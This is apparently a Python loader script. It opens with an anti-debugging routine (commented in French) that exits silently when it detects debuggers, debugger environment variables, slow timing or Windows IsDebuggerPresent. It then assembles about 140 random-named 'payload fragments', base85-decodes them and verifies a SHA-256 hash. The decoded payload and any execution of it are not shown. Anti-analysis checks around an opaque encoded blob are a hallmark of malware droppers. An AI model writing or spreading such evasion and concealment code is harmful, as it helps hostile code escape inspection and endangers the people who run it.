#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_chz7MQsQUpJVca = 'gBu;&l79MJGZWT-N;Yka-1c*okWXUKf$N5hR>*-o#N}~l03lYWnY)kH|G7FM;ijT=SJEd7'
_cdH3uJJ4Dya9Mc = 'Dx9+x<V}c&>*9c9iO<Vgi~oM(J_;=`2&zdUjJ<ngY34F52JJF8B?=p;Rh`)5u~T;*?|h%$'
_cy0exX7tL_FgVq = 'Gj~L&HxXNCsj?92gExMW5801Ny?qzVPH4hX;5&TqgYbj{bX8d8FgTYh2lhbDIHtb$pg3q{'
_cvaE5fOBPDJ0AH = '|LN09g0PIq9RP<yb?{}tSF~Lsv+<(`j#sN>!n>>WHc0&q8@QP$g%PSTZ@^UxNwdd6-R0_o'
_clYwGNK6chTZ_r = '=qA-A(d&Y=OOVu6xb=53)P#Qu8z|h?I}IiB-0X49#~ZoQsmxgP;tXZ}G@;3s%W2}b^{Hxv'
_cxzrujfzVuW433 = 'WyyJ%#Mheb^>EY2hG=u4S%&-K0X%omZ$0-@0Lhj(vNHioZ~~}=Vmc5jE#B`&_k+27G%jSz'
_cfnhDqYC14OJO0 = '(VIW-A+4#WZ+8kao>%o+WP;?Bz56qKnRtHKfcXC&@?CFj>wn_r^Zd}cW+3y&lo9wJ{}@rm'
_ccaJuQFzaMMMJr = 'fuetVK4${*zzV4=jH84QAIMkG!T;1|4)6kIn7Pl}$3@({mbi_9YZ@A?XGam~lM+(U_++%h'
_cn8jZbaXWzuV46 = 'n}gTFqj=+?BI0c-7V8Sj8Y1eQF3=>cJDt_EwZ@rIf_S5>b*&*h!J%so5ixtAqESub+*!tn'
_clVeozS6EwW70q = '!w9c2_3pRFzq`Tep!mt*#S27~(Zmg|$->EA#=l;mE5A7j!W?1?Y2L=v$>ROKo8Mz2=j1)N'
_cx7eBPBvqDNBLK = 'B^3NIT!4fB78HiU+J9Kq__>UzT}Y+4zcPA-$&P=Zr)o8&@aF$2#3^{v#Lo8n{PN*4*%lh<'
_ctC3B4FqkQmHAO = 'dwou0tQ{<o2Aj_USB~SQkgVErxx06rBbiJ#LLdAaE1lFb%XTDORh?6)x#@S^>`)l<jW-_o'
_cstIih1ebWDSnm = '`)4#TzA1zHv5D$5%hnJaj@3hS<x?#Bpva6u_!^1ps7;W|xujY3x7lpiFja3qS2PL<%kHTD'
_cdRkwTx5wPcbyL = 'O%MoWYvp`pcM*V0DJFWmQ+gyIlR6P_M(?!0|A*Bv=NwPveQEGR2S@Zb?k)+cTFVa7NmP0Q'
_ceYI3gMupa39ue = '!WZ*K@K){|n~33n6x&_HeY&}2ik$JJU*X0f4ep)V7Vf85ph2d2QnjuY)DT!0Vg{fGAS69%'
_culXSveI5wKpLO = '_q7RrE>rcm?`Dch+g#2KzUYp=U&5~I%fi$}eX$x%JFv&+4$P=XK(I$wLA5nUlZ(boQrS9l'
_cio6pyLW85c6dp = 'v%867nk=GnnxNA#P|vQ=t{lYlzAFqU2msg-U&wxLzs5c;D$?)J%<y>(j@|WIDH|~b@;~p+'
_csiuz02cDO1_N_ = '%;2urX=9NGcR}9Hcro<oMW1GF{5Kq@GejMg!W~LUAwE|5P)xyRMI*0_;4glSJIEH>=_Y9N'
_cq2375p6jPTzyK = '30qJKZDP_^rGJwn+^NX!hyS2!eR%-6mEgOC)#Cpf*fVUI1STT0MRy}hf92kHxON1q5=g<j'
_cuPYejhK5D01sO = '17n!H+RIr4o&aByzYQGt1D`#K5x000n9-^Y6-BDJBzc+%$kCB&&W%qI#F3U<ftpP?!j4Op'
_cg_NajQWuKN5xC = '4?eH$J<H(#nF4C#A<7QV@!<>FAGz-W$>w2>q_E5y0FLeVdZS%Bl`chKDAPt0r29JCuh%ke'
_cdhW3OnL2cyetn = 'tR!g<=86$Ti*2Oj1?xm4rDba%Q>T;~ofyL*Ox&-jwwCJe()N>tKbW7nl>w~NICMiWL@5)F'
_ceRJk3hy5qlrfI = '=&U>ME=egmb2F{2fXk4UkyT)=5Z!!vuDYOME}1L>K0SN1ng@1F=UwL|4FtyXlI6P~VMCSp'
_cwqTuIUoa1NS3N = 'O_9?J_`H7G7w(E3|0F02RHJ2YQ9ci>FRjfbS773+6IfPNM6qM-5U+>d3Gu!JK`?FW4egVR'
_cyqfwbdVrFAMaw = '^?4<;wUr48L<S9^+%YCV&xJY`8{5IH5<e$cGQdC8As2=w_tRKoYPa@0E}kiH`ZSy4;$kqj'
_cwreCYbi8sjK_5 = 'TD8?HQCPWq<cvl6N}v&{iOL_E3;^n4G7jw=iC^41zbx=Xg`<!jB}K)BBm<{EWHD>sM<ZUL'
_ccEyNbRAup8bpM = 'JTfe9m<K4b!#W8@8PLn_tsGxMzhQ0B=b2+27^89~@dgh`eCatfjz5ZF3S^%mS^)Y)N%M!X'
_cpnwJv3bBvvWc7 = '6`?H$f3TZVG85@d&V0&c@GCEypuU1{5ep#Lg@Xq0#bny(%%=c@F~D{A-G>#3<4{E(401`s'
_cdRcwKkHF7O_Wb = '1GS+kmR_<4+#?Y@zL@yK?TUm>tOm_Z4@t3#Sw9WKMqJ3uivU^r`aMGq{waBw5qoJm&Td|H'
_cfosrkk2jcN09f = '{P9+EH2o-(>J0m2SiiFbrDaG4Fwd&qO4`~DmJ&%6YpGaC(+*IH8{GSaKTFuiA*ULkF6lN?'
_caOoKmGwAcHr3K = '4X#i4wq5{qA+}F>7CmW$3XQ(+<JkFXsYUmLcU1tfj_xKjxyhk!VRRxQ3zz$ofQM~RR%+Z-'
_cm0gYH_apYheLL = '03o_}ECdAAeS2;Nn?q=eHFh?*AV*Y}VUh;SWlANW^u%cl)h{u)_{V#XNw~WRyyLZN6;sq4'
_ccrDQgA66cIo9n = 'IiX(M01QxuJPf}LJfevA;D=Qwi<^dA9XA1o?J$tW4{<FpeTth);mZudfgk1@MDu#7<I#D0'
_cn7WakEqSusEWo = 'XeGv0NoDeK*>(~GcacWPqy%o4Cn$)9XvE)TCpY>WVp>HbprFKJQ`>>~XW)PrlX*gd!7uJ}'
_cvJT3Q_TNi4FbZ = 'lf-#-pPO)>E@~q{pA@9rpEggWN;3$TU+Z7bHTqbnWnFU;vzim9!W&*IBL)Y-l0sS$u<wb#'
_cjBZgnMFRnyglI = 'A>=ffybhin(rT}){b&>#4L(lmnHrh|8QP!rgpTV|XhP4~bwfNB5|szyt7zoiuOUw8!4Yf~'
_c_uMqq3RUsZMnz = '_EEmyN9w3Sdsc>jM1OUBM)@S{kvvywPx_|Mj-k%!P0_(MyXwH{egCdlqQAE%RWfSI=BZy{'
_cu6FEmhyUpK1VA = 'DY=BCC1a%9k@Z_zL;8=8U_kL<mqXGTxw2n!fQwes<ERHFr)ode>yQ=4qV~*K6SU~R13DZ*'
_cvCg_xCvAwqCDE = 'xMD#mUskS~kRPpL`f?R}Y}`Ak3I^#jzf>&=st25y-_;T<NR=pjUbMIQ`eZU<70GSR&*qyC'
_c_oZKgqlj46Sm9 = '_wwcvt5_K1+kR=@PxwI0LlqL}>_1S;4H+yvs3ljRB?Ka^#n5gaHG)v3WypDg$5p+WLa?j~'
_cyP9Ob_wArbmxz = 'E%J!vzdU2*F{i$~VKb$z4j$-`gt=@4z9ZBB<zi<F!98{9fP_z>#SQv7g1;?LsnGqD1)Y#d'
_ckuk8ylR1zPS82 = 'g>Y4()pUmxJt1q!%yI1t@=ge@tywmXZY#&sAEGSu7b_)o8A8_je9mAVj!f?02VjvP^O)xu'
_c_PE__Q7H1TJk9 = '-&%P9R%}@dKv6z|H9E0MTggB>J!C!A$G>0hdNG@o*>OwW<gKB^kq2VJKEu8prrlbmFlMdL'
_czleNa7GElHWTS = 'r3$K}rz2mhM=6r-95Kl=)}(<M`96MVmGsSh4;8;hnJ!_N+VVaE_)I^Le}HqjDycm?nh7v>'
_crlirw8pKsF2Tm = '7bOu&%JG|w5&K7f-c-s$qeJSxpiJ<`;QaXi7ANb)55o$@7Hw1Roqs8(3#D-kfySDj>|5`F'
_ckLUy5vfEuScOI = 'j1lh@={q0EV=e=k@s~YKL0i{X`rDXPD;PMZ6#rkY0JnKrF;-ua;qLY#@8~!n^*jYfkPu&_'
_chDLwsnCm26tZQ = 'u;d*Z=#jzY<It`@K2AVA^6?m*>k7cNo{>L^P)7vE0@fR=7!G0_`aQtNw_Yt~(*E+0k$4je'
_cgrR6ruwtSFzCU = 'QKPzo{qv4QmSjEZjc`Zd>~&-mN!P}F<3Mz!-XGB=Su7RzPAcUQW49I|>b<wzmV+IZUS;Ch'
_cgC1ShLEhmY4XO = 'm+f5QW)3om+v4dDRO3wij>1d=DBW#l5jg&`t;Ww~T)dp_Pb>D~OqVCcW@sfh$ZSULEd*On'
_chIXRzsCOiAGgg = 'HbeJ5h(<EF{HJ^ndjmh7wVH?R#0+1yUslpBOIT$PDx!x0(amEX;7@tO`Px5~ej!aXzn=pF'
_coxw4lDnpmUKYK = 'Fq?fh#1|mR8QO`dGLrhAu9H)<6wKX0w0(I~D_DZ&58wu$Eoz|*y&Ks_`Z;s3LeHQH%@c?G'
_comVFkGUZkCET8 = 'z5M7HL1RXceZOR{r&|t48D%@^Z>>6xuFf**4ME#StEB&K>(ypdzhnY#X-5sz3wkc2LiNiP'
_cubcbPLHpPShLc = 'y2}O0bb~r~O7q4pCmJG+j>~!9?!zJPnXBULmgKT%(g<9G=!3vvLx7Y+S#_apzK{8P)nr2U'
_cbw3nhl7WT2xU5 = '5d3`eVxnD_6%9OCzAbm+j=Reb*F0GyF1Q&yVpGpQlTDsV85jfIdBda-%+|j}?$<NM(vYwk'
_cnvYY0_C9suBru = '6lJ1Cv$QBZ<RX(@E){k?WuxI6pmJdeBMc!n`=fT{7QV=S%b~CN$9Bn-hhSq;ZX&ppCeBMo'
_cuqU1Nps0x9fxq = 'L<-R;<UWP&gb0$B1GD@u@o>*Qf8lfIjh%|pYapV2V^6llCqo+n0PF}ZiP&zWsD{*`9|9;|'
_ctxJjmPRWMuIO2 = 'Yiw*hfvE9#vFD&q3JekZXic}SM=f1uQg0qf$bX~6W2g&p-vMnVtG}E=*3VERD|U~DNd?z|'
_cc7zT_GwEnvq7g = 'l<1_z61O!Z^m)V$u=M6hM8@uK;^7%#pk`D18ykGbwJ`#m<DLYmZc)cwZAE4=as>1z-TOEz'
_cyyXCtHjyVHnXu = 'NtZ+%3<mLpPu&Pr&uY@@@BPoS4q%7QEusb&r&Z>`oNMoS5fF_&&DXh?kDngBc&A+5frW!p'
_cqGyjokSdhk7B9 = 'paU!qkZH9#65Vizx+Z&`ixmzrvDlNw+di3MWjcy|%bB`@9K3KoJwC#t7fmJ)L$2V7)pWI6'
_cm0FbpFwOEXHEN = 'wqKJ<2hIAUi+XPYo3lm;!;yfA5k{z4smpkk$Rz4-jmr=8;L-!I$~o<y>v0S&s;W479XQi?'
_cn2Ibont9EntdE = 'Ur)n$sBGOCwqp6}h~uZrz|1u;Q<i-3Syg@e63Hmh$y)<Enw!{_P{oCGBoOBzRFHN8&zY}U'
_cyQ73CmafsnWhc = 'JPC!R1K{srU?rL8Ndr|Xo$#sNTEzp*;PFWr<g2~^VA6P_*kc;lX`Uo|X*s(0;6QveFqnwm'
_cpSvtHKSpaFiSD = 'P(DrVKJD#DQcf)23sW&>@s+PSaUu4Yb6YWORS)E*s$8MUxcsCQuJ-$^qZ#?6rLyvfe(I~Z'
_chytvZnuKtDwxX = '36<|1T$#JgnaQLZ?D7OyLjnJtUTD5C;7XdyVPO;^r`AXL<4)#u#Bh1c%HtECa;NK7+2o(7'
_cqhhI_4JGYqjMu = '<^w>gT?$G&`%2_hcS+l@L%SB1Bh-7uY>horqN!TUBYoCCG&&KYSqD{fjf?4w8b0H$;URE{'
_cxqM3uZEtjY4NT = '@4D#W_!><2w&I_sqBt|R&Bt4tyxTrjbx6M3aK?+63`wT<v--Mu5`6}f^NYT!0ItyfLk2^('
_cs_oovP7YcQlaO = 'Q-Y?dTs7g#;*(Y@2<2UDj)YF`-WUW)>a1XV^*AZi7Bfgbb*Po6N(eJg75ZZviD0Ju)TCMb'
_cwx14g4nSoEhLx = 'sqWvqn&giOvqTV=-gkjor{b)nKHpQTccVW(I15CIILh!m6ZVQKt%`*#hh|BbHR@TAPL0nR'
_cm1jplqKQa0560 = 'cGlHD#%r~0xEjWID5jZ?@&pBfm;SECP*tV%bu&A4RC!d5s+NhdxgYDbRf9jZr2Y+RZma-R'
_cc1OsPCSdXRCrB = '&z2;yqp|^7At?Fa<F1GqC~>dE5Ie`)#tgNue=Ld0G$`_^B7?rz`Y8+h2%Bkp6$G-}NZ9|i'
_cegSjJrUCm7Uf2 = '1a@5W06$t4CSpJ|SpXT`+4qy1^FGYo3QND{!K`uJLL#dGSzPfWyJRi!megiL`>~2I*A`&6'
_c_JXENv9RoJQ5Q = 'AM50^U<r{K7#>Mz!8nnXa9FYIuX6Z=B|&S4nU|WzkFO<XFwQzOMDVz{H*W?GQ20DoyiWKe'
_ccQOb2v59QvGK7 = 'A{5KqUUc8Vr3IhYXfJ-%$Z1R)(!Zy`3ODQcL*W$Y0AvA$dnXyf^t&mdNn@B((8DPC>g8<>'
_ctCV2OGLnMjHSb = 'd=bJnwEC#16z=q%9UX%!$ouaKRbDi@K*Y)xjreX?=BM$9RS{xT$3P!0tr=Q-sfiNRM9?m>'
_cv1xKrHJyQdY3p = '>Dg79l{JubeD3XtXsqs~p)dGLxBpkhW|WCjaB`lu``Nl7<g{lf@*G9xdYsF!G21+&-9h|W'
_cgF_9RsFG6P0yp = 'AN~e4*ek@5^k5agRLamckv_zHNP;h{p1ans)B^{YdJIwRc0=VpO41`n9)^&>yXZV+T|o_B'
_cs5rYRQjPo8v8I = 'An!X#>N6nU`sz{P%;mH5<z<dq5L@7hyh6@eyAipEEp&mJtvW5AQ{y}jkAR|}J(Q%2qLWH%'
_ckogzBE5NFXzpm = '(kGTDuCL7AedZ|#a}H3q_*nGknjkrY+;A!q_(=AlW=7(CkC#y{J)B3^J-X$K%UMdr=3)(g'
_cd6YJI9_1DWEsj = 'nOGY_nWV2n_Jsp?5@P2gtplRaTE>k?@;eY>5pMK=)t{itlN(_#4SYa!va)8;N)Tn_&K&a;'
_ceY2SyfgypUuDf = 'X{p6-TR}9*khj$kkzk^3Y`ltS6YKE@%Ab!~v%O#3FP5)@6G|ATXR5Y74ep292Bqb?oq(1K'
_cdY2jcDFCA1c2F = 'YB!U8C>yeDdcJ62(<snXBqCskJv%f)QoH<(EiXdVy+k2{IIj@mp(xht9q<ciL1*IVc-HMa'
_cgDw3lS3j_cJd0 = 'Z(V|ik3*^*@4M;62=T%$ZTi@WJ?7?qUXfvppy>I!O)xTugL?O&bBKhwkliNQIInJlLVlG$'
_c_dz_baQniCyyh = 'BF3GsXEnc_W(i-3q_7SUaG~wa5Ca(!SGF7){GeH6a!`^*jGlWE?~Z=pY2+|3%bBE#vjtip'
_csCnLxuWMix6D3 = 'stkRZ6y0nrWogaBp`CK<oy4Xtsy@qJ<^5%!__6qnvt+ANIU>hk>Rw5~D7+dHZYeQy*U@5-'
_cxGmNMalm9XiZP = '+GJdxOonw#QNGitMSEXvKUJUCLtcz{ZvQ8hP-DZ&RzYNfaZRaud!nt%l@^fVCqHkeDLP>T'
_c_CsL_Qy7_79RI = '!N-l(H3I1kr$nd9r4Eo8xE{Y|>J}iNnm(e3`v1#i<#WSp>i_RNscye?m<_ACP@eCZG&*(B'
_cl_jytq7S3QtVB = '>J!{=BQ!)Ou1V$Ic=U?tc~~V(IpIbSF#O9*uSjdE*8OfY2(iB37^YXpq3zepiB+bD2xEkK'
_c_0izb8EMrVldX = 'AX76SnLKHe^45cOgT;On`d4uG`pRlFq^(*OHp4Z&3~=J1u$a$qM<&bkVG2uRfjE@8RAeK_'
_csWfptk6f4hbrL = 'ylMH}E-P6>VlK9D4F+2xK_HC#suDXu{9>6-9PG<*ucIw8-TPECDYE0K$Z;AdrncFiv4`=#'
_cy6JlCPera6rbz = 'Dp9@4g1E?zK!?BglR}3$nq)X=Z4pLK2J;=eEPMk))~(SnIW)v*%X%J7s%%}9vEb`Ze!+kj'
_coKq0KYgfRY_kG = 'g(*yoc&Ia{sh+J}SL`w}RsJ=S{K7BhjtfoS9zxV4@flZ0?qz`(8d(ey{nma9h?skJKiuF{'
_cu9Nm0NrBcLufs = 'OE3vF5x@Uv{kTepm)ms3b%9433nirvm1p<>;_`Q9fQ2ec?MUa4%$&X?b0c#&+I1jrQD4CT'
_cfyYEG051MsDr_ = 'xPC<clj!M_(rw?SmDRu7=6nmdPVjMkUL}1FT@6k0m+_=|-CBd`@u(umxqXRn7~A()GL+(-'
_cbFSINUkrFRRZe = 'lwnQt<(_tH6JfW~PMk3oNJ22pq<K)xFzI!(7<P|CaL5djdXVzl1_Z@-t=@!mDaUyGFSiku'
_cfEjFAw7eMiTZH = '<6R236MyfAxa-detu#{!t-;Pe!#{9l`k$0vKK#@tY6pGkgI;(hT~}UgmAwvZL*IU9{xkGJ'
_cqDx5wk46IVe2J = 'QRPL|;YNol@fUnRUZ{ShjBL?~Igpga+DbON>go`O^#A>MnH|Zz;WUyo4DWV91R<&?zrG1='
_ccgCIVpIPUNMDB = 't*z>g=_s0Oxpy%(UL^j7c|x5S4V|DG%=mM4#EzXw_@Vm}$k)N1p&J>47)vp>y=WK0ZCwN;'
_cdSGsNXUfh09OM = 'ycio<i4T(EJO4SQ`m6EG02yD*`Bj8$P3~W~zKL|>JsnSG=xib>L*DUtKNzc;st(@%T~2$B'
_ckMwrb78H8dilI = 'D$UJ5A+H}a^jf9GpJYtfzh+>plU(H;!4Tk7WO`$d9wLMbWzUjzkDQfk?H(00B@&#g;Z<}Y'
_cllT0mKm6v4sLd = 'y>r4A&~k3CBL^f)1-rGGLR!+r3@zWIa66}D$*NXVM{v@--sz`7b%~dImky4OP%IO&Q%}nn'
_coH8LftqX7fmEr = '0u}p);n#^5vY`2KK??)kZ(MZqX~5yzpBM25>dqis{hC!8mj~dS6SH|NA1Ky3oD8#F<ur|N'
_cfbCzjRaMAMxHp = 'QdmF3#K_^~2eIJ>6_){2`k{3p?~Oil=PuS-U3GksDqLT^@T(3bfk|9b)8@9sQan$JyvYM|'
_cbqT0h_V1cTUGh = '^A-s@E$K}rFZ2{8DG%`1Y2Uz3z@H+q+BTidzhpE`ZYTb@qZg#2;@OQCc#1YLIg1;9?eo0h'
_cjx5lbXieoWB5x = 'S^_Yr&Q}ydM7#a_hm5}dEZT3L6wqh5H5VUB6B#6H2W%^toOV$ho{z4BA!O&2_%`wUJh+)4'
_cdYV4_PjOl7Gpu = 'k*xYMIB7Px6HUy<kg7xE#2qdYz<N2Uc7xQGjY&^iSgdIJ7;ihwdxYye6&026aJL=-qO4*r'
_cyW2LiqBJcrT93 = 'pu&d1uMd<W=_ZUWgBFX`G7KY9Vudj{_RNdM)=d#Ij!eiP_G7G4(Z4>p;NHmmo5tx`@z0s='
_cuA_E5uiNCrDcH = 'ND4}+DJN;dcWxoHw0P|3Is%!0&s6cl%^EMk$of3fnEacRPb%Vnh5krd;Gmuar*OIN^kxpN'
_cmKCkt7qygCgyo = 'LjnnWC5`MO-5V2FT`eLebUAbs@Yo~&O1fhH8S54!4TW0L3`1g&5P7JoEjzpL@t+C#Nv#3W'
_caqKY5lv3cilWE = 'p<9~)@&N`x!X8}1BFk^K6mAVCPzi|U7^Ja_xdsaEmZV2SCWwu*pQOHwenv>lDHBSXDLMZY'
_cn0qgSSDbgebM9 = 'Sg6*YtV2E7ftIObZ-2WVnXe@WA#qAwsfLvDBL*+%t}@HnO0ZhLhYNg#*|+qdD*d&&4N;UY'
_ceLkAaEU9nNKyI = 'y<I}^ULhrDT197uY>;7THnbjFF>6Q7HAZxZl(Mds&+D?MI>qYn?Ts|yya{4DHcUq=XpHWM'
_cr4vxBZg8p4Loj = '*=I67qDo<HiyB}j4Zo#w6E{ata{;#I3+Q#o*4!GR8QW&-ZQVC%59vOQbR3sW8(`yelZ`3z'
_ciZzQ93Dy93bNl = '<HX*z`Y^)ga0Oh|2YNH;zpqS7$<g6b>o;dm&uWE>USG<xx&gjiX#Vd0F#kv!eZAiXkbEK>'
_cgi0jatW8yAtiR = '2_dr5N?ZGut7au-B;3t(nCC5YpJX$P^lzI8N2JK$Hzafqs1acZ!~LUVkIYtuo*)W`8!}0Q'
_cuVNPtWf4SvxPv = 'bz&1&|DW8S1O8{E%<-uio44{PbcUP967gHMX$P!>lZkluyj9<z=jgnMLjj;Zwf>^ZUd!BB'
_ca6LNqEhtdfvsC = '5S!z!+9YKQRc7Q#EnvMe%exEmyIbA>r$@PfgC(vV15K;XtdKMESPMfM(Jm=me_|t5aV+`c'
_crE1ohaK3dLuhJ = 'f>@S%c-H=|#zNHm4-!OKIt~&=$#H8~P)GBq)xEhA`Q##P`gr62w$dFT$l}7>(k{Vq6Ikys'
_cpLQtqLSXV1P7I = '<gHK&aZTQ^UZPZWXu4xvA=V&{^QAXCwPe_|&=S?qA(L8)p$siOc>GM#@kUnBOU7T;4wT!x'
_cvwfJX_nVEpuOf = 'Cn-46F3xwG$T7fKI3zrQhmvog*mL?XY>6g{Pcm@D%L?{fA$^6BI1Z!ju?Nd2xE(RDLwn?$'
_cvIxsPUubBal2l = 'iZ?U0GzRU9R001Y&{Lff>;&-{W#EILVne<&r>*c>I~0o2z0%v8B98;X7-AKT<0r)y)+m&d'
_c__tFPCrBv5LsR = '5Z2gmY<i79AQsfRP}_W=*}`~tqr1=H>vZ8#rd3o+-H5F)rV_v((mX7*fDX%tm<0^g<w>~f'
_c_GLejyDXoqoqc = 'eh{e96i95`>KPVFh=3ZKh~%E$!1SC9Pj&MH4&L1M75ZX=2LMS9=NS|@y4NUF1t{&_<hkz<'
_cptRKXCFi1nbCN = '9+mC@&^2HNFW!N1@sw|oBSAgT7X&-uuAp{iCAD!b?=Cg4Dd+$<K928a+Cvnyr9xV+Wt82w'
_cnel3LnL2_TX3P = 'O>rmVQ`z-QW9e^pwdvNE8#=~;+^bB0XDk4^L$E2XP0$39GdIzh9cC3DU0TV$p;~x64F@S2'
_cyRVfB8wMsbFKy = '#KO!YP4rBflbHYpA>1*(2Puo&RDgUGkPHq|oq{5E^p@G=W9#b6>}r@u?_kek>He0H`P+r*'
_cq1aHft6fs6oyt = 'o;{n{s4}yf65e9)mFsl2SuIbNy<b|=3+JswLm7B{u6}2gI;d}vk4qaPh*H3d*AJ3t4G^{}'
_czufIJjYvb0vPd = '#axU7^NzO~?}ZohVubR(Yq(AKn7iRmzg0e<*Q<*GFQJt^akI5-ciji;OfH75%7XsMys=LI'
_ci6df9CsKjglhY = '-pk|NOe>{z<ofDZZuB3RFKj3MyT3%>G$xd=ieOpTeHU75JwNxI$bWY$4<R3$EQ!|ZvqW-L'
_cn7aQS9HsSelt3 = '0|V?XR&NOnm}Z{9(zqtImH#i4IGu}$%_vT1|9&tRU?;T==<i_S3rnzVjm5;)pRa)*I_hc#'
_crIChLRu32t1Zd = '!*S{Zna+`MhP#L(K?Sn<36WWWLxKPM_HKge5D(IUz7f}&A*SzE5R2E9a<0>}l^9Ah6I7ls'
_cs4zG51Zv5ZGHt = 'F)O>S4A#Gjzw^jNrLhzar_Hj|{0t!&(1L9BTI3&SBmnIRik(0tCTdIoq^zMUwA4SD=vY?x'
_ctUst6fCA_Lzxj = '4MQQS#kY36#qGPQE@$O~%9~qavq5{i@^A`ix|S%=G(&C&g!fn}c&;QM_1UDSk2&n@)S89`'
_cxeWqrpXuA3mGW = '2zm1W4qp^W=B*R{0a>>{RDFQg;@;K>i^U-zy?M^cI(5VV5)ht+oo6|QsVlrU#3z^zU=!Yr'
_cy2Oo6sIMRdWS1 = 'uTc8kFsjIyj7tH$W05uHGIsraZPwjA37Zw5Za7!#!qOcVmPb3Z2*#19V+L`7affnUM{s{W'
_ckztMB_qzNYN4G = '=6SvRA=A9(J8JY}Tf}2vP-g}dAIgJQhm(0`_I(vZkBV8V<eYmmL;;B3g0VN~c%FBZ#nde2'
_ckZcIUjF1LYhZe = '_m?V$w^qw|euVpHzF_6FZtty@xpMRBaoIkL?@Kp#m;'

_pziHG3M8Of_n0z = __import__('base64').b85decode(_chz7MQsQUpJVca + _cdH3uJJ4Dya9Mc + _cy0exX7tL_FgVq + _cvaE5fOBPDJ0AH + _clYwGNK6chTZ_r + _cxzrujfzVuW433 + _cfnhDqYC14OJO0 + _ccaJuQFzaMMMJr + _cn8jZbaXWzuV46 + _clVeozS6EwW70q + _cx7eBPBvqDNBLK + _ctC3B4FqkQmHAO + _cstIih1ebWDSnm + _cdRkwTx5wPcbyL + _ceYI3gMupa39ue + _culXSveI5wKpLO + _cio6pyLW85c6dp + _csiuz02cDO1_N_ + _cq2375p6jPTzyK + _cuPYejhK5D01sO + _cg_NajQWuKN5xC + _cdhW3OnL2cyetn + _ceRJk3hy5qlrfI + _cwqTuIUoa1NS3N + _cyqfwbdVrFAMaw + _cwreCYbi8sjK_5 + _ccEyNbRAup8bpM + _cpnwJv3bBvvWc7 + _cdRcwKkHF7O_Wb + _cfosrkk2jcN09f + _caOoKmGwAcHr3K + _cm0gYH_apYheLL + _ccrDQgA66cIo9n + _cn7WakEqSusEWo + _cvJT3Q_TNi4FbZ + _cjBZgnMFRnyglI + _c_uMqq3RUsZMnz + _cu6FEmhyUpK1VA + _cvCg_xCvAwqCDE + _c_oZKgqlj46Sm9 + _cyP9Ob_wArbmxz + _ckuk8ylR1zPS82 + _c_PE__Q7H1TJk9 + _czleNa7GElHWTS + _crlirw8pKsF2Tm + _ckLUy5vfEuScOI + _chDLwsnCm26tZQ + _cgrR6ruwtSFzCU + _cgC1ShLEhmY4XO + _chIXRzsCOiAGgg + _coxw4lDnpmUKYK + _comVFkGUZkCET8 + _cubcbPLHpPShLc + _cbw3nhl7WT2xU5 + _cnvYY0_C9suBru + _cuqU1Nps0x9fxq + _ctxJjmPRWMuIO2 + _cc7zT_GwEnvq7g + _cyyXCtHjyVHnXu + _cqGyjokSdhk7B9 + _cm0FbpFwOEXHEN + _cn2Ibont9EntdE + _cyQ73CmafsnWhc + _cpSvtHKSpaFiSD + _chytvZnuKtDwxX + _cqhhI_4JGYqjMu + _cxqM3uZEtjY4NT + _cs_oovP7YcQlaO + _cwx14g4nSoEhLx + _cm1jplqKQa0560 + _cc1OsPCSdXRCrB + _cegSjJrUCm7Uf2 + _c_JXENv9RoJQ5Q + _ccQOb2v59QvGK7 + _ctCV2OGLnMjHSb + _cv1xKrHJyQdY3p + _cgF_9RsFG6P0yp + _cs5rYRQjPo8v8I + _ckogzBE5NFXzpm + _cd6YJI9_1DWEsj + _ceY2SyfgypUuDf + _cdY2jcDFCA1c2F + _cgDw3lS3j_cJd0 + _c_dz_baQniCyyh + _csCnLxuWMix6D3 + _cxGmNMalm9XiZP + _c_CsL_Qy7_79RI + _cl_jytq7S3QtVB + _c_0izb8EMrVldX + _csWfptk6f4hbrL + _cy6JlCPera6rbz + _coKq0KYgfRY_kG + _cu9Nm0NrBcLufs + _cfyYEG051MsDr_ + _cbFSINUkrFRRZe + _cfEjFAw7eMiTZH + _cqDx5wk46IVe2J + _ccgCIVpIPUNMDB + _cdSGsNXUfh09OM + _ckMwrb78H8dilI + _cllT0mKm6v4sLd + _coH8LftqX7fmEr + _cfbCzjRaMAMxHp + _cbqT0h_V1cTUGh + _cjx5lbXieoWB5x + _cdYV4_PjOl7Gpu + _cyW2LiqBJcrT93 + _cuA_E5uiNCrDcH + _cmKCkt7qygCgyo + _caqKY5lv3cilWE + _cn0qgSSDbgebM9 + _ceLkAaEU9nNKyI + _cr4vxBZg8p4Loj + _ciZzQ93Dy93bNl + _cgi0jatW8yAtiR + _cuVNPtWf4SvxPv + _ca6LNqEhtdfvsC + _crE1ohaK3dLuhJ + _cpLQtqLSXV1P7I + _cvwfJX_nVEpuOf + _cvIxsPUubBal2l + _c__tFPCrBv5LsR + _c_GLejyDXoqoqc + _cptRKXCFi1nbCN + _cnel3LnL2_TX3P + _cyRVfB8wMsbFKy + _cq1aHft6fs6oyt + _czufIJjYvb0vPd + _ci6df9CsKjglhY + _cn7aQS9HsSelt3 + _crIChLRu32t1Zd + _cs4zG51Zv5ZGHt + _ctUst6fCA_Lzxj + _cxeWqrpXuA3mGW + _cy2Oo6sIMRdWS1 + _ckztMB_qzNYN4G + _ckZcIUjF1LYhZe)
if __import__('hashlib').sha256(_pziHG3M8Of_n0z).hexdigest() != '95aa1713ba3abc2f26a77c7b9e3afa14f5aa3cdcf2e697175ff10b57e2e5ef4a':
    __import__('sys').exit(1)
